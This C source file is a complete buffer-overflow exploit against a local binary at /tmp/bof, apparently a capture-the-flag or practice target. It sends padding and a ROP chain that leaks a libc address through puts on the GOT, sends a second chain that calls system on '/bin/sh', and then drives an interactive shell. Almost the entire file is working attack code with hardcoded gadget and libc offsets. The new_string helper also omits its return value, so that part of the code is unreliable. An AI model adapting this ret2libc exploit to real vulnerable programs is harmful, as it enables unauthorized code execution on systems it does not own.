#include <stdio.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <signal.h>
#include <stdint.h>
#include <assert.h>
#include <stdbool.h>
#include <pthread.h>
#include <readline/readline.h>
#include <readline/history.h>

struct proc {
    int pid;
    int stdin;
    int stdout;
};

struct string {
    char * strbuf;
    size_t len;
};

struct string * new_string(size_t len) {
    struct string * String = (struct string*)malloc(sizeof(struct string));
    String->strbuf = (char*)malloc(len);
    assert(String->strbuf != NULL);
    String->len = len;
}

struct string * charptr2str(char * str) {
    size_t len = strlen(str);
    struct string * String = new_string(len);
    memcpy(String->strbuf, str, len);
    return String;
}

struct string * buf2str(char * str, size_t len) {
    struct string * String = new_string(len);
    memcpy(String->strbuf, str, len);
    return String;
}

void strputs(struct string * String) {
    write(1, String->strbuf, String->len);
}

void free_string(struct string * String) {
    free(String->strbuf);
    free(String);
}

struct proc * proc_create(char * path) {
    int pid;
    int inpipefd[2];
    int outpipefd[2];
    
    pipe(inpipefd);
    pipe(outpipefd);

    pid = fork();

    if(!pid) { // child
        dup2(outpipefd[0], 0);
        dup2(inpipefd[1], 1);
        dup2(inpipefd[1], 2);

        char *args[] = {path, 0};
        prctl(PR_SET_PDEATHSIG, SIGTERM);
        execve(path, args, NULL);
        exit(0);
    }

    close(inpipefd[1]);
    close(outpipefd[0]);

    struct proc * Proc = (struct proc*)malloc(sizeof(struct proc));
    Proc->pid = pid;
    Proc->stdin = outpipefd[1];
    Proc->stdout = inpipefd[0];
    return Proc;
}

struct string * proc_recv(struct proc * Proc, size_t len) {
    char * buf = malloc(len);
    size_t read_size = read(Proc->stdout, buf, len);
    buf = realloc(buf, read_size);
    struct string * String = (struct string*)malloc(sizeof(struct string));
    String->strbuf = buf;
    String->len = read_size;
    return String;
}

size_t proc_send(struct proc * Proc, struct string * String) {
    return write(Proc->stdin, String->strbuf, String->len);
}

void * proc_recvloop(struct proc * Proc) {
    while(true) {
        struct string * String = proc_recv(Proc, 1024);
        strputs(String);
        free_string(String);
    }
}

void proc_interactive(struct proc * Proc) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    
    char * buf = NULL;
    struct string * String = NULL;
    pthread_t thread_id;
    size_t len = 0;

    pthread_create(&thread_id, NULL, proc_recvloop, Proc);
    usleep(1500);

    while(true) {
        buf = readline("$ ");

        len = strlen(buf);
        buf = realloc(buf, len+1);
        buf[len] = '\n';

        String = buf2str(buf, len+1);
        proc_send(Proc, String);
        free_string(String);
        free(buf);
        usleep(5000);
    }
}

int main(void) {
    struct proc * Proc = proc_create("/tmp/bof");
    struct string * String = NULL;

    String = proc_recv(Proc, 1024);
    strputs(String);
    free_string(String);
 
    char payload[0x100];
    memset(payload, 0x41, 0x18);
    uint64_t * ropchain = (uint64_t *)&payload[0x18];
    uint32_t idx = 0;

    const uint64_t pop_rdi_ret = 0x401263;
    ropchain[idx++] = pop_rdi_ret;
    ropchain[idx++] = 0x404018; // puts.got
    ropchain[idx++] = 0x401060; // puts
    ropchain[idx++] = 0x401176; // main
    ropchain[idx++] = 0xa; // newline

    String = buf2str(payload, 0x39);
    proc_send(Proc, String);
    free_string(String);

    uint64_t leak = 0;
    String = proc_recv(Proc, 6);
    memcpy(&leak, String->strbuf, String->len);
    free_string(String);
    leak -= 0x875a0;

    printf("[+] libc leak: %p\n", leak);
    idx = 0;
    ropchain[idx++] = pop_rdi_ret+1;
    ropchain[idx++] = pop_rdi_ret;
    ropchain[idx++] = leak + 0x1b75aa; // /bin/sh
    ropchain[idx++] = leak + 0x55410; // system
    ropchain[idx++] = 0xa; // newline

    free_string(proc_recv(Proc, 1024));
    String = buf2str(payload, 0x39);
    proc_send(Proc, String);
    free_string(String);

    puts("[+] Spawning shell");
    proc_interactive(Proc);
}
